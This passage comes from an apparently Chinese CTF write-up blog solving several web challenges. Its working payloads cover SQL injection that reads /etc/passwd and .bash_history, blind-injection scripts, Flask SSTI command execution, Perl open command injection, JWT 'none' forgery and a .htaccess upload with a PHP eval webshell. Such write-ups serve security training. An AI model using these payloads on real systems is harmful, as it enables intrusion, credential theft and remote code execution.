class="line">&#x27;, content=load_file(&#x27;/etc/passwd&#x27;),/*</span><br></pre></td></tr></table></figure><p><img src="buu3/26.png"></p><p>读取一下历史操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=load_file(&#x27;/home/www/.bash_history&#x27;),/*</span><br></pre></td></tr></table></figure><p><img src="buu3/27.png"></p><p>整理一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmpunzip html.zip#解压rm -rf html.zip#删除压缩包cp -r html /var/www/cd /var/www/htmlrm -rf .DS_Store</span><br></pre></td></tr></table></figure><p>发现路径/var/www/html .DS_Store文件被删除了，但/tmp/html目录下的.DS_Store文件还在，读取一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=load_file(&#x27;/tmp/html/.DS_Store&#x27;),/*</span><br></pre></td></tr></table></figure><p>返回的东西好像有的没办法读取，我们通过十六进制输出，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=(select hex(load_file(&#x27;/tmp/html/.DS_Store&#x27;))),/*</span><br></pre></td></tr></table></figure><p><img src="buu3/28.png"></p><p>转化发现文件flag_8946e1ff1ee3e40f.php</p><p><img src="buu3/29.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=(select hex(load_file(&#x27;/var/www/html/flag_8946e1ff1ee3e40f.php&#x27;))),/*</span><br></pre></td></tr></table></figure><p>最后拿到flag。</p><h3 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h3><p>15年的sql题，有点早了。</p><p>有个修改密码的，感觉像二次注入，实现修改管理员密码。</p><p>当我们注册用户名时加入双引号，再到修改密码时，报错。</p><p><img src="buu3/30.png"></p><p>开始通过注册用户名来实现注入，fuzz测试，空格被过滤了。</p><p>报错注入，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7c,database()),1)#</span><br></pre></td></tr></table></figure><p><img src="buu3/31.png"></p><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#</span><br></pre></td></tr></table></figure><p><img src="buu3/32.png"></p><p>爆字段名，为flag。</p><p><img src="buu3/33.png"></p><p>拿flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7c,(select(group_concat(flag))from(flag))),1)#</span><br></pre></td></tr></table></figure><p>这里如果有括号就不需要再加单引号表示字符串了。</p><p><img src="buu3/34.png"></p><p>假的flag。</p><p>尝试一下爆users表。</p><p><img src="buu3/35.png"></p><p>希望这次别再把戏了。</p><p><img src="buu3/36.png"></p><p>这个表名不完整，真的像个小丑。</p><p>盲猜是</p><p>real_flag_1s_here</p><p>这返回的是啥，果然投机取巧不行。</p><p><img src="buu3/37.png"></p><p>这里主要应该是想让我们突然长度限度，之前再学习报错注入的时候，也经常有这样的问题。</p><p>这里空格被过滤了，想使用limit函数不太行。</p><p>学习新技法，<a href="https://blog.csdn.net/qq_36761831/article/details/82862135">正则匹配</a>。</p><p>通过正则匹配读flag。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),1)#</span><br></pre></td></tr></table></figure><p>只拿到一部分flag。</p><p><img src="buu3/38.png"></p><p>这里使用不了right，被过滤了，可以使用逆序输出reverse。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))),1))#</span><br></pre></td></tr></table></figure><p><img src="buu3/39.png"></p><p><img src="buu3/40.png"></p><p>通过php函数sttrev函数再逆序输出，</p><p>或者通过python，列表方法输出。</p><p><img src="buu3/41.png"></p><p><strong>本题关键：正则匹配寻找flag技巧突破报错函数长度限制，同时使用函数reverse()进行逆序输出利用</strong></p><h3 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h3><p>存在ssti注入，提示很明显。</p><p>f12查看源码，根据提示get方法，通过search参数。构造相关payload。证明存在ssti注入。</p><p><img src="buu3/42.png"></p><p>查看一下类，</p><p><img src="buu3/44.png"></p><p>尝试查看所有类，也可以查看，想通过catch_warnings类，还有命令执行，都行不通。</p><p>学会使用一个新子类，subprocess.Popen。我们通过python脚本来爆破出subprocess.Popen子类位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsimport htmlimport timefor i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">300</span>):    time.sleep(<span class="number">0.06</span>)    url=<span class="string">&#x27;http://a7d6afce-442f-47cb-840a-b35cd23f0e70.node3.buuoj.cn?search=&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__()[%d]&#125;&#125;&#x27;</span> %(i)    r = requests.get(url)    <span class="comment">#print(url)    if &quot;subprocess.Popen&quot; in html.unescape(r.text):        print(i)        break</span></span><br></pre></td></tr></table></figure><p>258</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="buu3/45.png"></p><p>通过查找得到最后的payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;cat ../flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到flag。</p><h3 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];    &#125;    echo $_SERVER[&quot;REMOTE_ADDR&quot;];    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);    @mkdir($sandbox);    @chdir($sandbox);    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));    $info = pathinfo($_GET[&quot;filename&quot;]);    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[&quot;basename&quot;]), $data);    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</p><p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数，之前就遇到过，和escapeshellcmd配合形成漏洞。</p><p>pathinfo() 函数以数组的形式返回文件路径的信息。</p><p>代码审计，首先创建一个沙盒文件夹，路径为sandbox/加上MD5加密过后的orange加页面输出的ip</p><p>通过url参数传入的内容执行命令，把以filename参数传入的内容命名文件，最后把结果存入。</p><p><strong>方法：FILE 协议利用 OPEN 命令执行。</strong></p><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/&amp;filename=123</span><br></pre></td></tr></table></figure><p>先尝试访问一下文件，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6d22ac66-1a1c-40d8-8ac8-4fa47d32a90e.node3.buuoj.cn/sandbox/fcf2bccafc269c160382150a0166d632/123</span><br></pre></td></tr></table></figure><p><img src="buu3/46.png"></p><p>看到readflag，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p><img src="buu3/47.png"></p><p><em><strong>GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求,GET函数底层就是调用了open处理</strong></em></p><p><em><strong>open存在命令执行，并且还支持file函数</strong></em></p><p><em><strong>直接使用file协议的open命令执行payload：</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash -c /readflag|&amp;filename=123</span><br></pre></td></tr></table></figure><p>这里要特别注意这个命令执行的使用，<strong>首先得满足前面的文件存在, 才会继续到open语句</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|/?url=file:bash -c /readflag|&amp;filename=123/sandbox/fcf2bccafc269c160382150a0166d632/123</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/3f82685f56a8">参考</a></p><p><strong>本题关键：file协议利用open命令执行</strong></p><h3 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h3><p>尝试登陆admin，弹窗</p><p><img src="buu3/48.png"></p><p>尝试注册，也注册不来，感觉需要我们以admin身份登陆拿flag。</p><p>百度了一下split，感觉跟js代码有关系，找一下。</p><p>f12可以看到app.js，访问。</p><p>提示是基于Node.js的koa框架，但是这个页面的代码并不是逻辑代码，用处不大。<br>在注释里提示静态文件处理出现问题，那么可能会出现任意文件读取漏洞</p><p><strong>这里需要对koa框架的目录有一定的了解。</strong></p><p><strong>其中controllers目录是项目控制器存放目录：接受请求，处理逻辑</strong></p><p><strong>访问controllers/api.js发现处理逻辑</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);const fs = require(&#x27;fs&#x27;)const jwt = require(&#x27;jsonwebtoken&#x27;)const APIError = require(&#x27;../rest&#x27;).APIError;module.exports = &#123;    &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;        const &#123;username, password&#125; = ctx.request.body;        if(!username || username === &#x27;admin&#x27;)&#123;            throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);        &#125;        if(global.secrets.length &gt; 100000) &#123;            global.secrets = [];        &#125;        const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);        const secretid = global.secrets.length;        global.secrets.push(secret)        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);        ctx.rest(&#123;            token: token        &#125;);        await next();    &#125;,    &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123;        const &#123;username, password&#125; = ctx.request.body;        if(!username || !password) &#123;            throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;);        &#125;        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;        console.log(sid)        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;            throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);        &#125;        const secret = global.secrets[sid];        const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);        const status = username === user.username &amp;&amp; password === user.password;        if(status) &#123;            ctx.session.username = username;        &#125;        ctx.rest(&#123;            status        &#125;);        await next();    &#125;,    &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;        if(ctx.session.username !== &#x27;admin&#x27;)&#123;            throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);        &#125;        const flag = fs.readFileSync(&#x27;/flag&#x27;).toString();        ctx.rest(&#123;            flag        &#125;);        await next();    &#125;,    &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123;        ctx.session.username = null;        ctx.rest(&#123;            status: true        &#125;)        await next();    &#125;&#125;;</span><br></pre></td></tr></table></figure><p><img src="buu3/49.png"></p><p>可以伪造jwt进行登陆。</p><p>其实前面应该先用burp抓包一下，思路更明显，直接发现JWT.其实题目提示也很明显，登陆。</p><p>JWT支持算法为None，如果alg字段为None，签名会被置空，这样任何的token都是有效的，后端将不执行签名验证</p><p><a href="https://www.freebuf.com/articles/web/181261.html">深入了解JWT攻击</a></p><p>通过网站<a href="https://jwt.io/">https://jwt.io/</a></p><p>得到数据，然后伪造，置为none，让”secretid”为空，他的加密算法就为空，所以那个加密就废了</p><p>或者，下面分开base64编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;.&#123;&quot;secretid&quot;:[],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 1587632063&#125;.</span><br></pre></td></tr></table></figure><p>这里base64加密都不加. </p><p>加密后有等号，去掉，再分别加上.</p><p>两个都是这样，最后拼接。</p><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjogImFkbWluIiwicGFzc3dvcmQiOiAiMTIzNDU2IiwiaWF0IjogMTU4NzYzMjA2M30.</span><br></pre></td></tr></table></figure><p><img src="buu3/50.png"></p><p>点击get flag，然后抓包go。</p><p><img src="buu3/52.png"></p><p>也可以通过python进行加密，python有JWT模块，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwttoken = jwt.encode(&#123;  <span class="string">&quot;secretid&quot;</span>: [],  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>,  <span class="string">&quot;iat&quot;</span>: <span class="number">1590657826</span>&#125;,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><h3 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h3><p>—sql盲注+无列名注入</p><p>fuzz测试一下，发现||没被过滤，information被过滤了，应该是和无列名注入有关了。</p><p>测试回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2||1=1</span><br></pre></td></tr></table></figure><p>正确返回，Nu1L</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2||1=2</span><br></pre></td></tr></table></figure><p>错误返回，V&amp;N</p><p>爆数据库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://637c56e9-8e90-4d3c-8f52-76fc2058a8bf.node4.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left=<span class="number">32</span></span><br><span class="line">    right=<span class="number">128</span></span><br><span class="line">    mid=(left+right)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (left&lt;right):</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;2||(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid)&#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;429&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;404&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            left=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;V&amp;N&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            right=mid</span><br><span class="line">        mid=(left+right)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(mid==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># give_grandpa_pa_pa_pa</span></span><br></pre></td></tr></table></figure><p>由于information_schema被过滤了，我们需要使用其他的库，<a href="https://www.anquanke.com/post/id/193512">参考</a></p><p>我们试一下<strong>sys.x$schema_flattened_keys</strong>是可以用的。</p><p>爆破数据表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=&quot;http://637c56e9-8e90-4d3c-8f52-76fc2058a8bf.node4.buuoj.cn/index.php&quot;</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    left=32</span><br><span class="line">    right=128</span><br><span class="line">    mid=(left+right)&gt;&gt;1</span><br><span class="line">    while (left&lt;right):</span><br><span class="line">        data=&#123;&quot;id&quot;:&quot;2||(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid)&#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        if &#x27;429&#x27; or &#x27;404&#x27; in r.text:</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">        if &#x27;Nu1L&#x27; in r.text:</span><br><span class="line">            left=mid+1</span><br><span class="line">        if &#x27;V&amp;N&#x27; in r.text:</span><br><span class="line">            right=mid</span><br><span class="line">        mid=(left+right)&gt;&gt;1</span><br><span class="line">    if(mid==32 or mid ==127):</span><br><span class="line">        break</span><br><span class="line">    flag+=chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到两个表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1ag_1s_h3r3_hhhhh,users233333333333333</span><br></pre></td></tr></table></figure><p>后面的不会处理了，<a href="https://blog.csdn.net/weixin_45669205/article/details/116064642?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">看一下讲的很详细的一篇不错的文章</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://637c56e9-8e90-4d3c-8f52-76fc2058a8bf.node4.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        res+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    res=<span class="string">&#x27;0x&#x27;</span>+res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;2||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(str_hex(flag+<span class="built_in">chr</span>(j)))&#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;429&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;404&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>function get_the_flag()&#123;    <span class="comment">// webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#x27;<span class="meta">&lt;?</span>&#x27;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;, $hhh) )    die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>代码审计，通过符号_参数get传入内容，这里有个正则匹配，我们尝试异或进行绕过一下，前面的文章有介绍。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure><p><img src="buu3/57.png"></p><p>成功绕过，看见版本号等等信息。</p><p>补充一下post提交的异或方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = (%9e ^ %ff).(%8c ^ %ff).(%8c ^ %ff).(%9a ^ %ff).(%8d ^ %ff).(%8b ^ %ff);\\assert$b = &quot;_&quot; . (%af ^ %ff).(%b0 ^ %ff).(%ac ^ %ff).(%ab ^ %ff);$c = $$b;\\$b = $_POST$a($c[1]);</span><br></pre></td></tr></table></figure><p>本题不能使用post提交。</p><p>成功后我们尝试执行函数get_the_flag，目的应该是让我们上传文件，三个限制条件，</p><p>1、文件中内容没有&lt;?</p><p>2、使用函数exif_imagetype来判断是否为图片，这里我们一般使用GIF89A文件头绕过。</p><p>3、后缀名中不允许出现ph</p><p>是apache中间件，这里尝试上传.htaccess文件，如果上传.user.ini，还要求目录下有php文件。</p><p>这里需要特别注意，如果使用GIF89A文件头绕过，.htaccess文件无法生效，我们学习了一下，可以通过添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337#define height 1337</span><br></pre></td></tr></table></figure><p>#在.htaccess是注释符，所以.htaccess文件可以生效，</p><p>在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)<br>x00x00x8ax39x8ax39 是wbmp文件的文件头<br>.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess</p><p>接下来是绕过&lt;?过滤，由于版本是php7.2，无法使用标签进行注入。</p><p>我们可以通过base64编码一句话，然后在.htaccess文件利用php伪协议进行解码，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337#define height 1337 AddType application/x-httpd-php .abcphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc&quot;</span><br></pre></td></tr></table></figure><p>shell.abc内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg==</span><br></pre></td></tr></table></figure><p>这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则,使用其他的文件头也是可以的</p><p>上脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsimport base64htaccess = b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application/x-httpd-php .abcphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc&quot;&quot;&quot;&quot;shell = b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#x27;a&#x27;]);?&gt;&quot;)url = 